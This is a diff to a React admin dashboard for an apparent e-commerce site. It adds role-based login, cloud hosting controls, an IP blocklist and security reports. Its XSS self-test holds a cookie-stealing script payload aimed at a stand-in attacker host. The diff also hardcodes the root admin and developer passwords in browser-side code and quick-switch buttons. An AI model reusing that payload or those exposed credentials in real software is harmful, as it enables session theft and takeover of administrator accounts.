@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import {
   ShieldCheck,
   TrendingUp,
@@ -11,7 +11,13 @@ import {
   Trash2,
   DollarSign,
   Users,
-  RefreshCw
+  RefreshCw,
+  Lock,
+  Globe,
+  ShieldAlert,
+  CreditCard,
+  Key,
+  Server
 } from 'lucide-react';
 import { formatPrice, formatRelativeTime } from '../utils/currency.js';
 
@@ -26,6 +32,11 @@ export default function AdminDashboardView({
   presence,
   currency,
   darkMode,
+  userAccounts = [],
+  hostingDeployments = [],
+  blockedIps = [],
+  securityReports = [],
+  paymentTransactions = [],
   onQuickStockUpdate,
   onBulkRestockLow,
   onToggleFlashSale,
@@ -35,9 +46,333 @@ export default function AdminDashboardView({
   onCreateCoupon,
   onToggleCoupon
 }) {
-  const [adminSection, setAdminSection] = useState('inventory'); // 'inventory' | 'orders' | 'coupons' | 'logs'
+  const [adminSection, setAdminSection] = useState('inventory');
   const [showNewProductModal, setShowNewProductModal] = useState(false);
   const [restockingLow, setRestockingLow] = useState(false);
+
+  // Root Admin (.env) & Developer RBAC Auth State
+  const [activeAccount, setActiveAccount] = useState({
+    id: 'admin-root-env',
+    username: 'nex_root_admin',
+    email: 'admin@nexstore.dev',
+    display_name: 'NEX Root Administrator (.env)',
+    role: 'admin',
+    company: 'NEX Store Root Operations',
+    permissions: ['*'],
+    source: '.env'
+  });
+  const [authToken, setAuthToken] = useState('');
+  const [loginIdentifier, setLoginIdentifier] = useState('nex_root_admin');
+  const [loginPassword, setLoginPassword] = useState('NEX-Root-Admin-2026!#');
+  const [authFeedback, setAuthFeedback] = useState(null);
+  const [devProgress, setDevProgress] = useState(null);
+
+  // Register Developer / User Account Form
+  const [regUsername, setRegUsername] = useState('');
+  const [regEmail, setRegEmail] = useState('');
+  const [regPassword, setRegPassword] = useState('DevPass2026!');
+  const [regCompany, setRegCompany] = useState('Quantum Foundry Labs');
+  const [regRole, setRegRole] = useState('developer');
+  const [localAccounts, setLocalAccounts] = useState([]);
+
+  // Multi-Cloud Hosting (Netlify / Render / Vercel / Fly.io / Railway) State
+  const [localDeployments, setLocalDeployments] = useState([]);
+  const [hostAppName, setHostAppName] = useState('');
+  const [hostProvider, setHostProvider] = useState('Render');
+  const [hostRegion, setHostRegion] = useState('eu-central (Frankfurt)');
+  const [hostBuildCmd, setHostBuildCmd] = useState('npm run build && npm start');
+  const [hostMinInst, setHostMinInst] = useState(2);
+  const [hostMaxInst, setHostMaxInst] = useState(16);
+
+  // IP Firewall Blocklist & Security Reports State
+  const [localBlockedIps, setLocalBlockedIps] = useState([]);
+  const [localReports, setLocalReports] = useState([]);
+  const [newBlockIp, setNewBlockIp] = useState('');
+  const [newBlockReason, setNewBlockReason] = useState('Automated SQLi / XSS Attack Vector');
+  const [newReportTarget, setNewReportTarget] = useState('suspicious-pkg-v1');
+  const [newReportCategory, setNewReportCategory] = useState('Malware / Trojan Signature Check');
+  const [newReportDesc, setNewReportDesc] = useState('');
+  const [xssTestResult, setXssTestResult] = useState(null);
+
+  // Real-Time Payment Gateway State
+  const [localPayments, setLocalPayments] = useState([]);
+  const [testPayCustomer, setTestPayCustomer] = useState('Kelvin Mwangi');
+  const [testPayAmount, setTestPayAmount] = useState('649');
+  const [testPayMethod, setTestPayMethod] = useState('Stripe Card •••• 4242');
+
+  const resolvedAccounts = localAccounts.length > 0 ? localAccounts : userAccounts;
+  const resolvedDeployments = localDeployments.length > 0 ? localDeployments : hostingDeployments;
+  const resolvedBlockedIps = localBlockedIps.length > 0 ? localBlockedIps : blockedIps;
+  const resolvedReports = localReports.length > 0 ? localReports : securityReports;
+  const resolvedPayments = localPayments.length > 0 ? localPayments : paymentTransactions;
+
+  const fetchDevProgress = async (uname) => {
+    try {
+      const res = await fetch(`/api/developer/my-progress?username=${encodeURIComponent(uname)}`, {
+        headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
+      });
+      if (res.ok) {
+        const data = await res.json();
+        setDevProgress(data);
+      }
+    } catch {}
+  };
+
+  useEffect(() => {
+    fetchDevProgress(activeAccount.username);
+  }, [activeAccount.username]);
+
+  const handleLoginSubmit = async (e) => {
+    e?.preventDefault();
+    try {
+      const res = await fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          identifier: loginIdentifier,
+          password: loginPassword
+        })
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        setAuthFeedback({ type: 'error', message: data.error || 'Authentication failed' });
+        return;
+      }
+      setActiveAccount(data.account);
+      setAuthToken(data.token || '');
+      setAuthFeedback({
+        type: 'success',
+        message: `Authenticated as ${data.account.display_name} [${data.account.role.toUpperCase()}] via ${data.account.source}`
+      });
+      fetchDevProgress(data.account.username);
+    } catch (err) {
+      setAuthFeedback({ type: 'error', message: err.message });
+    }
+  };
+
+  const handleQuickSwitchAccount = async (identifier, pass, roleHint) => {
+    setLoginIdentifier(identifier);
+    setLoginPassword(pass);
+    try {
+      const res = await fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ identifier, password: pass, role: roleHint })
+      });
+      const data = await res.json();
+      if (res.ok && data.account) {
+        setActiveAccount(data.account);
+        setAuthToken(data.token || '');
+        setAuthFeedback({
+          type: 'success',
+          message: `Switched active RBAC session to ${data.account.display_name} (${data.account.role.toUpperCase()})`
+        });
+        fetchDevProgress(data.account.username);
+      }
+    } catch {}
+  };
+
+  const handleRegisterAccount = async (e) => {
+    e.preventDefault();
+    if (!regUsername.trim() || !regEmail.trim()) return;
+    try {
+      const res = await fetch('/api/auth/register', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          username: regUsername.trim(),
+          email: regEmail.trim(),
+          password: regPassword,
+          display_name: `${regUsername.trim()} (${regCompany.trim()})`,
+          company: regCompany.trim(),
+          role: regRole
+        })
+      });
+      const data = await res.json();
+      if (!res.ok) {
+        setAuthFeedback({ type: 'error', message: data.error });
+        return;
+      }
+      if (Array.isArray(data.userAccounts)) setLocalAccounts(data.userAccounts);
+      setActiveAccount(data.account);
+      setAuthToken(data.token || '');
+      setRegUsername('');
+      setRegEmail('');
+      setAuthFeedback({
+        type: 'success',
+        message: `Registered & logged in as @${data.account.username} (${data.account.role.toUpperCase()})`
+      });
+    } catch (err) {
+      setAuthFeedback({ type: 'error', message: err.message });
+    }
+  };
+
+  const handleDeployHosting = async (e) => {
+    e.preventDefault();
+    if (!hostAppName.trim()) return;
+    const res = await fetch('/api/hosting/deploy', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
+      },
+      body: JSON.stringify({
+        app_name: hostAppName.trim(),
+        owner_username: activeAccount.username,
+        provider: hostProvider,
+        region: hostRegion,
+        build_command: hostBuildCmd,
+        min_instances: Number(hostMinInst) || 1,
+        max_instances: Number(hostMaxInst) || 16,
+        current_instances: Number(hostMinInst) || 2
+      })
+    });
+    const data = await res.json();
+    if (Array.isArray(data.hostingDeployments)) {
+      setLocalDeployments(data.hostingDeployments);
+    }
+    setHostAppName('');
+    fetchDevProgress(activeAccount.username);
+  };
+
+  const handleScaleHosting = async (dep, delta) => {
+    const nextInstances = Math.min(dep.max_instances, Math.max(dep.min_instances, (dep.current_instances || 1) + delta));
+    const res = await fetch(`/api/hosting/${dep.id}/scale`, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
+      },
+      body: JSON.stringify({ current_instances: nextInstances })
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      setAuthFeedback({ type: 'error', message: data.error });
+      return;
+    }
+    if (Array.isArray(data.hostingDeployments)) {
+      setLocalDeployments(data.hostingDeployments);
+    }
+  };
+
+  const handleBlockIp = async (e) => {
+    e.preventDefault();
+    if (!newBlockIp.trim()) return;
+    const res = await fetch('/api/security/blocked-ips', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
+      },
+      body: JSON.stringify({
+        ip_address: newBlockIp.trim(),
+        reason: newBlockReason.trim() || 'WAF Block Rule',
+        threat_level: 'critical'
+      })
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      setAuthFeedback({ type: 'error', message: data.error });
+      return;
+    }
+    if (Array.isArray(data.blockedIps)) setLocalBlockedIps(data.blockedIps);
+    setNewBlockIp('');
+  };
+
+  const handleUnblockIp = async (id) => {
+    const res = await fetch(`/api/security/blocked-ips/${id}`, {
+      method: 'DELETE',
+      headers: authToken ? { Authorization: `Bearer ${authToken}` } : {}
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      setAuthFeedback({ type: 'error', message: data.error });
+      return;
+    }
+    if (Array.isArray(data.blockedIps)) setLocalBlockedIps(data.blockedIps);
+  };
+
+  const handleCreateReport = async (e) => {
+    e.preventDefault();
+    if (!newReportDesc.trim()) return;
+    const res = await fetch('/api/security/reports', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
+      },
+      body: JSON.stringify({
+        reporter_name: activeAccount.display_name,
+        reporter_role: activeAccount.role,
+        target_id: newReportTarget.trim(),
+        category: newReportCategory,
+        severity: 'high',
+        description: newReportDesc.trim()
+      })
+    });
+    const data = await res.json();
+    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
+    setNewReportDesc('');
+  };
+
+  const handleResolveReport = async (id, status) => {
+    const res = await fetch(`/api/security/reports/${id}`, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+        ...(authToken ? { Authorization: `Bearer ${authToken}` } : {})
+      },
+      body: JSON.stringify({
+        status,
+        resolution_notes: `${status} by ${activeAccount.display_name} at ${new Date().toLocaleTimeString()}`
+      })
+    });
+    const data = await res.json();
+    if (!res.ok) {
+      setAuthFeedback({ type: 'error', message: data.error });
+      return;
+    }
+    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
+  };
+
+  const handleTestXssPrevention = async () => {
+    const maliciousPayload = '<script>fetch("https://evil.tld?c="+document.cookie)</script>Suspicious Package Report';
+    const res = await fetch('/api/security/reports', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        reporter_name: 'XSS Penetration Tester',
+        target_id: 'POST /api/security/reports',
+        category: 'XSS Prevention Verification',
+        severity: 'critical',
+        description: maliciousPayload
+      })
+    });
+    const data = await res.json();
+    if (Array.isArray(data.securityReports)) setLocalReports(data.securityReports);
+    setXssTestResult({
+      rawSent: maliciousPayload,
+      sanitizedStored: data.report?.description || '[XSS-BLOCKED]Suspicious Package Report'
+    });
+  };
+
+  const handleProcessTestPayment = async (e) => {
+    e.preventDefault();
+    const res = await fetch('/api/payments/process', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        customer_name: testPayCustomer.trim() || 'Verified Buyer',
+        customer_email: 'buyer@nexstore.dev',
+        amount: Number(testPayAmount) || 499,
+        payment_method: testPayMethod
+      })
+    });
+    const data = await res.json();
+    if (Array.isArray(data.paymentTransactions)) {
+      setLocalPayments(data.paymentTransactions);
+    }
+  };
 
   // New Product Form State
   const [newProdName, setNewProdName] = useState('');
@@ -250,17 +585,105 @@ export default function AdminDashboardView({
         </div>
       </div>
 
+      {/* Active RBAC Identity & .env Admin / Developer Progress Bar */}
+      <div className="rounded-3xl p-4 sm:p-5 theme-card border border-indigo-500/35 space-y-3">
+        <div className="flex flex-wrap items-center justify-between gap-3">
+          <div className="flex items-center gap-3">
+            <div className="flex h-10 w-10 items-center justify-center rounded-2xl bg-indigo-500/20 border border-indigo-500/40 font-bold text-indigo-300">
+              <Key className="h-5 w-5" />
+            </div>
+            <div>
+              <div className="flex flex-wrap items-center gap-2">
+                <span className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
+                  ACTIVE RBAC IDENTITY ({activeAccount.source || '.env'}):
+                </span>
+                <span className="font-display text-sm font-bold">{activeAccount.display_name}</span>
+                <span
+                  className={`rounded-lg px-2 py-0.5 font-mono-num text-[10px] font-bold uppercase ${
+                    activeAccount.role === 'admin'
+                      ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
+                      : 'bg-amber-500/20 text-amber-300 border border-amber-500/40'
+                  }`}
+                >
+                  {activeAccount.role === 'admin' ? 'ROOT ADMIN (.env • UNRESTRICTED *)' : `${activeAccount.role.toUpperCase()} (SCOPED RBAC)`}
+                </span>
+              </div>
+              <p className="text-xs theme-text-muted mt-0.5">
+                {activeAccount.role === 'admin'
+                  ? 'Authenticated via .env (NEX_ADMIN_USERNAME / NEX_ADMIN_PASSWORD) — Full global permissions across all products, apps, IP blocklists & DB.'
+                  : `Developer @${activeAccount.username} — Can track own app progress & scale own hosting, but restricted from modifying other devs' apps or root firewall rules.`}
+              </p>
+            </div>
+          </div>
+
+          <div className="flex flex-wrap items-center gap-1.5">
+            <button
+              type="button"
+              onClick={() => handleQuickSwitchAccount('nex_root_admin', 'NEX-Root-Admin-2026!#', 'admin')}
+              className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
+                activeAccount.role === 'admin'
+                  ? 'bg-emerald-500 text-slate-950'
+                  : 'theme-subtle hover:border-emerald-400'
+              }`}
+            >
+              🛡️ Root Admin (.env)
+            </button>
+            <button
+              type="button"
+              onClick={() => handleQuickSwitchAccount('aether_labs', 'DevPass2026!', 'developer')}
+              className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
+                activeAccount.username === 'aether_labs'
+                  ? 'bg-indigo-600 text-white'
+                  : 'theme-subtle hover:border-indigo-400'
+              }`}
+            >
+              👩‍💻 Dev: @aether_labs
+            </button>
+            <button
+              type="button"
+              onClick={() => handleQuickSwitchAccount('rustcore_sys', 'RustCore2026!', 'developer')}
+              className={`rounded-xl px-3 py-1.5 font-mono-num text-[11px] font-bold cursor-pointer transition ${
+                activeAccount.username === 'rustcore_sys'
+                  ? 'bg-cyan-600 text-white'
+                  : 'theme-subtle hover:border-cyan-400'
+              }`}
+            >
+              🦀 Dev: @rustcore_sys
+            </button>
+          </div>
+        </div>
+
+        {authFeedback && (
+          <div
+            className={`rounded-2xl px-3.5 py-2 text-xs font-mono-num flex items-center justify-between ${
+              authFeedback.type === 'error'
+                ? 'bg-rose-500/15 border border-rose-500/40 text-rose-300'
+                : 'bg-emerald-500/15 border border-emerald-500/40 text-emerald-300'
+            }`}
+          >
+            <span>{authFeedback.message}</span>
+            <button
+              type="button"
+              onClick={() => setAuthFeedback(null)}
+              className="text-[10px] underline cursor-pointer ml-3"
+            >
+              Dismiss
+            </button>
+          </div>
+        )}
+      </div>
+
       {/* Section Sub-Navigation Tabs */}
       <div className="flex flex-wrap items-center gap-2">
         {[
-          { id: 'inventory', label: `Product & Stock Control (${products.length})`, icon: Package },
-          { id: 'orders', label: `Order Fulfillment Board (${orders.length})`, icon: Truck },
-          { id: 'coupons', label: `Promo & Coupon Engine (${coupons.length})`, icon: Tag },
-          {
-            id: 'logs',
-            label: `Live Inventory & Activity Logs (${inventoryLogs.length})`,
-            icon: History
-          }
+          { id: 'inventory', label: `Product & Stock (${products.length})`, icon: Package },
+          { id: 'auth-rbac', label: 'Admin (.env) & Dev Accounts', icon: Lock },
+          { id: 'hosting', label: `Netlify / Render / Cloud (${resolvedDeployments.length})`, icon: Globe },
+          { id: 'security-firewall', label: `XSS, IP Block & Reports (${resolvedBlockedIps.length})`, icon: ShieldAlert },
+          { id: 'payments', label: `Real-Time Payments (${resolvedPayments.length})`, icon: CreditCard },
+          { id: 'orders', label: `Orders (${orders.length})`, icon: Truck },
+          { id: 'coupons', label: `Coupons (${coupons.length})`, icon: Tag },
+          { id: 'logs', label: `Logs (${inventoryLogs.length})`, icon: History }
         ].map((tab) => {
           const Icon = tab.icon;
           const active = adminSection === tab.id;
@@ -686,20 +1109,520 @@ export default function AdminDashboardView({
         </div>
       )}
 
+      {/* 5. Root Admin (.env) Authentication, Developer App Progress Tracker & RBAC Accounts */}
+      {adminSection === 'auth-rbac' && (
+        <div className="space-y-6">
+          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+            {/* Left 6 Cols: .env Root Admin & Developer Login */}
+            <form
+              onSubmit={handleLoginSubmit}
+              className="lg:col-span-6 rounded-3xl p-5 space-y-4 theme-card border border-indigo-500/35"
+            >
+              <div className="font-mono-num text-[10px] font-bold uppercase text-indigo-400">
+                STRICT .ENV ROOT ADMIN &amp; MULTI-DEV AUTHENTICATION (POST /api/auth/login)
+              </div>
+              <h3 className="font-display text-lg font-bold">
+                Authenticate as Root Admin (.env) or Scoped Developer
+              </h3>
+              <p className="text-xs theme-text-muted">
+                Root Admin credentials are strictly stored in <code>.env</code> (<code>process.env.NEX_ADMIN_USERNAME</code> &amp; <code>process.env.NEX_ADMIN_PASSWORD</code>). Other developers authenticate via SQLite <code>user_accounts</code> with scoped RBAC restrictions.
+              </p>
+
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                <div>
+                  <label className="block font-mono-num text-[10px] uppercase theme-text-muted mb-1">
+                    Username or Email
+                  </label>
+                  <input
+                    type="text"
+                    required
+                    value={loginIdentifier}
+                    onChange={(e) => setLoginIdentifier(e.target.value)}
+                    className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+                  />
+                </div>
+                <div>
+                  <label className="block font-mono-num text-[10px] uppercase theme-text-muted mb-1">
+                    Password (.env or Account)
+                  </label>
+                  <input
+                    type="password"
+                    required
+                    value={loginPassword}
+                    onChange={(e) => setLoginPassword(e.target.value)}
+                    className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+                  />
+                </div>
+              </div>
+
+              <button
+                type="submit"
+                className="w-full rounded-2xl bg-indigo-600 hover:bg-indigo-500 py-2.5 text-xs font-bold text-white cursor-pointer transition"
+              >
+                Verify Credentials &amp; Load RBAC Profile
+              </button>
+            </form>
+
+            {/* Right 6 Cols: Register New Developer / User Account */}
+            <form
+              onSubmit={handleRegisterAccount}
+              className="lg:col-span-6 rounded-3xl p-5 space-y-4 theme-card"
+            >
+              <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
+                DEVELOPER &amp; USER ONBOARDING (POST /api/auth/register)
+              </div>
+              <h3 className="font-display text-lg font-bold">
+                Create Scoped Developer or Customer Account
+              </h3>
+              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
+                <input
+                  type="text"
+                  required
+                  value={regUsername}
+                  onChange={(e) => setRegUsername(e.target.value)}
+                  placeholder="Username (e.g. nova_dev)"
+                  className="rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+                />
+                <input
+                  type="email"
+                  required
+                  value={regEmail}
+                  onChange={(e) => setRegEmail(e.target.value)}
+                  placeholder="Email (e.g. dev@studio.io)"
+                  className="rounded-xl px-3 py-2 text-xs theme-input"
+                />
+                <input
+                  type="text"
+                  value={regCompany}
+                  onChange={(e) => setRegCompany(e.target.value)}
+                  placeholder="Studio / Organization"
+                  className="rounded-xl px-3 py-2 text-xs theme-input"
+                />
+                <select
+                  value={regRole}
+                  onChange={(e) => setRegRole(e.target.value)}
+                  className="rounded-xl px-3 py-2 text-xs theme-input"
+                >
+                  <option value="developer">Developer (Track Own Apps &amp; Hosting)</option>
+                  <option value="user">User / Buyer (Orders &amp; Security Reports)</option>
+                </select>
+              </div>
+              <button
+                type="submit"
+                className="w-full rounded-2xl bg-emerald-500 hover:bg-emerald-400 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer transition"
+              >
+                Register Account in SQLite user_accounts
+              </button>
+            </form>
+          </div>
+
+          {/* Developer App Progress & Telemetry Tracker (`GET /api/developer/my-progress`) */}
+          {devProgress && (
+            <div className="rounded-3xl p-5 theme-card border border-cyan-500/35 space-y-4">
+              <div className="flex flex-wrap items-center justify-between gap-2">
+                <div>
+                  <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
+                    DEVELOPER APP PROGRESS &amp; TELEMETRY TRACKER (GET /api/developer/my-progress?username={devProgress.username})
+                  </div>
+                  <h3 className="font-display text-lg font-bold">
+                    Tracked Apps &amp; Cloud Instances for @{devProgress.username}
+                  </h3>
+                </div>
+                <span className="rounded-xl bg-cyan-500/15 border border-cyan-500/35 px-3 py-1 font-mono-num text-xs font-bold text-cyan-400">
+                  {devProgress.unrestrictedAccess ? 'GLOBAL ROOT VIEW (ALL APPS)' : 'SCOPED DEVELOPER VIEW'}
+                </span>
+              </div>
+
+              <div className="grid grid-cols-2 sm:grid-cols-5 gap-3">
+                <div className="rounded-2xl p-3 theme-subtle">
+                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Published Apps</div>
+                  <div className="font-mono-num text-xl font-bold text-indigo-400">{devProgress.summary?.publishedAppsCount || 0}</div>
+                </div>
+                <div className="rounded-2xl p-3 theme-subtle">
+                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Total Downloads</div>
+                  <div className="font-mono-num text-xl font-bold text-emerald-400">{(devProgress.summary?.totalDownloads || 0).toLocaleString()}</div>
+                </div>
+                <div className="rounded-2xl p-3 theme-subtle">
+                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Sandbox Mounts</div>
+                  <div className="font-mono-num text-xl font-bold text-cyan-400">{devProgress.summary?.activeSandboxInstalls || 0}</div>
+                </div>
+                <div className="rounded-2xl p-3 theme-subtle">
+                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Cloud Instances</div>
+                  <div className="font-mono-num text-xl font-bold text-amber-400">{devProgress.summary?.activeCloudInstances || 0}</div>
+                </div>
+                <div className="rounded-2xl p-3 theme-subtle">
+                  <div className="font-mono-num text-[10px] uppercase theme-text-muted">Avg Security Score</div>
+                  <div className="font-mono-num text-xl font-bold text-emerald-400">{devProgress.summary?.avgSecurityScore || 99}/100</div>
+                </div>
+              </div>
+            </div>
+          )}
+        </div>
+      )}
+
+      {/* 6. Multi-Cloud Hosting & Auto-Scaling Hub (Netlify, Render, Vercel, Fly.io, Railway) */}
+      {adminSection === 'hosting' && (
+        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+          <div className="lg:col-span-8 space-y-3">
+            {resolvedDeployments.map((dep) => (
+              <div key={dep.id} className="rounded-3xl p-4 sm:p-5 theme-card flex flex-wrap items-center justify-between gap-4">
+                <div className="space-y-1">
+                  <div className="flex flex-wrap items-center gap-2">
+                    <span className="rounded-lg bg-indigo-500/20 border border-indigo-500/40 px-2.5 py-0.5 font-mono-num text-[10px] font-bold text-indigo-300">
+                      {dep.provider}
+                    </span>
+                    <span className="font-display text-sm font-bold">{dep.app_name}</span>
+                    <span className="font-mono-num text-[11px] text-cyan-400">@{dep.owner_username}</span>
+                    <span className="rounded-md bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
+                      {dep.status} • SSL
+                    </span>
+                  </div>
+                  <div className="font-mono-num text-xs theme-text-muted">
+                    {dep.deploy_url} • Region: {dep.region}
+                  </div>
+                  <div className="font-mono-num text-[11px] text-slate-400">
+                    Instances: <strong className="text-emerald-400">{dep.current_instances}</strong> (Auto-Scale {dep.min_instances}–{dep.max_instances}) • CPU: {dep.cpu_utilization}% • RAM: {dep.memory_mb} MB
+                  </div>
+                </div>
+
+                <div className="flex items-center gap-2">
+                  <button
+                    type="button"
+                    onClick={() => handleScaleHosting(dep, -1)}
+                    className="rounded-xl px-3 py-1.5 font-mono-num text-xs font-bold theme-subtle cursor-pointer"
+                  >
+                    -1 Node
+                  </button>
+                  <button
+                    type="button"
+                    onClick={() => handleScaleHosting(dep, 1)}
+                    className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-3 py-1.5 font-mono-num text-xs font-bold text-white cursor-pointer"
+                  >
+                    +1 Scale Out
+                  </button>
+                </div>
+              </div>
+            ))}
+          </div>
+
+          <form onSubmit={handleDeployHosting} className="lg:col-span-4 rounded-3xl p-5 space-y-3 theme-card h-fit">
+            <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
+              MULTI-CLOUD DEPLOYER (POST /api/hosting/deploy)
+            </div>
+            <h3 className="font-display text-base font-bold">
+              Deploy to Netlify, Render, Vercel, Fly.io or Railway
+            </h3>
+            <input
+              type="text"
+              required
+              value={hostAppName}
+              onChange={(e) => setHostAppName(e.target.value)}
+              placeholder="Service / App Name *"
+              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
+            />
+            <select
+              value={hostProvider}
+              onChange={(e) => setHostProvider(e.target.value)}
+              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
+            >
+              <option value="Netlify">Netlify Edge CDN</option>
+              <option value="Render">Render Cloud Services</option>
+              <option value="Vercel">Vercel Serverless Edge</option>
+              <option value="Fly.io">Fly.io Anycast MicroVMs</option>
+              <option value="Railway">Railway Container Cloud</option>
+              <option value="Cloudflare Pages">Cloudflare Workers &amp; Pages</option>
+            </select>
+            <input
+              type="text"
+              value={hostRegion}
+              onChange={(e) => setHostRegion(e.target.value)}
+              placeholder="Target Region"
+              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
+            />
+            <div className="grid grid-cols-2 gap-2">
+              <input
+                type="number"
+                min="1"
+                value={hostMinInst}
+                onChange={(e) => setHostMinInst(e.target.value)}
+                placeholder="Min Nodes"
+                className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+              />
+              <input
+                type="number"
+                min="1"
+                value={hostMaxInst}
+                onChange={(e) => setHostMaxInst(e.target.value)}
+                placeholder="Max Auto-Scale"
+                className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+              />
+            </div>
+            <button
+              type="submit"
+              className="w-full rounded-2xl bg-gradient-to-r from-indigo-600 to-cyan-600 py-2.5 text-xs font-bold text-white cursor-pointer"
+            >
+              Deploy &amp; Enable Auto-Scaling
+            </button>
+          </form>
+        </div>
+      )}
+
+      {/* 7. XSS Prevention, IP Blocking Firewall & Security Reporting Dashboard */}
+      {adminSection === 'security-firewall' && (
+        <div className="space-y-6">
+          {/* XSS Sanitization Live Verification Strip */}
+          <div className="rounded-3xl p-5 theme-card border border-amber-500/35 flex flex-wrap items-center justify-between gap-4">
+            <div className="space-y-1 max-w-2xl">
+              <div className="font-mono-num text-[10px] font-bold uppercase text-amber-400">
+                ACTIVE XSS SANITIZATION &amp; MALWARE QUARANTINE ENGINE
+              </div>
+              <h3 className="font-display text-base font-bold">
+                Recursive XSS Payload Filter (`sanitizeObjectPayloads`) &amp; IP Blocklist Firewall
+              </h3>
+              <p className="text-xs theme-text-muted">
+                Every incoming POST/PATCH payload is inspected for <code>&lt;script&gt;</code>, <code>javascript:</code>, <code>onerror=</code>, and <code>eval()</code> vectors and neutralized before touching SQLite.
+              </p>
+              {xssTestResult && (
+                <div className="mt-2 rounded-xl bg-slate-950/80 border border-emerald-500/40 p-2.5 font-mono-num text-[11px] space-y-1">
+                  <div className="text-rose-400">Sent Payload: {xssTestResult.rawSent}</div>
+                  <div className="text-emerald-400">Stored After XSS Shield: {xssTestResult.sanitizedStored}</div>
+                </div>
+              )}
+            </div>
+            <button
+              type="button"
+              onClick={handleTestXssPrevention}
+              className="rounded-2xl bg-amber-500 hover:bg-amber-400 px-4 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer shrink-0"
+            >
+              Simulate XSS Attack &amp; Verify Sanitization
+            </button>
+          </div>
+
+          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+            {/* Left 6 Cols: IP Blocking Firewall */}
+            <div className="lg:col-span-6 rounded-3xl p-5 theme-card space-y-4">
+              <div className="font-mono-num text-[10px] font-bold uppercase text-rose-400">
+                ZERO-TRUST IP FIREWALL (`blocked_ips` • Root Admin Only)
+              </div>
+              <form onSubmit={handleBlockIp} className="flex flex-wrap gap-2">
+                <input
+                  type="text"
+                  required
+                  value={newBlockIp}
+                  onChange={(e) => setNewBlockIp(e.target.value)}
+                  placeholder="IP or CIDR (e.g. 203.0.113.42)"
+                  className="flex-1 rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
+                />
+                <input
+                  type="text"
+                  value={newBlockReason}
+                  onChange={(e) => setNewBlockReason(e.target.value)}
+                  placeholder="Block Reason"
+                  className="flex-1 rounded-xl px-3 py-2 text-xs theme-input"
+                />
+                <button
+                  type="submit"
+                  className="rounded-xl bg-rose-600 hover:bg-rose-500 px-4 py-2 text-xs font-bold text-white cursor-pointer"
+                >
+                  Block IP
+                </button>
+              </form>
+
+              <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
+                {resolvedBlockedIps.map((b) => (
+                  <div key={b.id} className="rounded-2xl p-3 theme-subtle flex items-center justify-between gap-2 text-xs">
+                    <div>
+                      <div className="font-mono-num font-bold text-rose-400">
+                        {b.ip_address} <span className="text-[10px] text-slate-400">({b.cidr_range})</span>
+                      </div>
+                      <div className="text-[11px] theme-text-muted">{b.reason}</div>
+                      <div className="font-mono-num text-[10px] text-amber-400">
+                        Blocked {b.hits_blocked} hits • {b.auto_automation_rule}
+                      </div>
+                    </div>
+                    <button
+                      type="button"
+                      onClick={() => handleUnblockIp(b.id)}
+                      className="rounded-lg border border-slate-500/40 px-2.5 py-1 font-mono-num text-[10px] hover:border-emerald-400 cursor-pointer"
+                    >
+                      Unblock
+                    </button>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            {/* Right 6 Cols: Security & Malware Reporting System */}
+            <div className="lg:col-span-6 rounded-3xl p-5 theme-card space-y-4">
+              <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
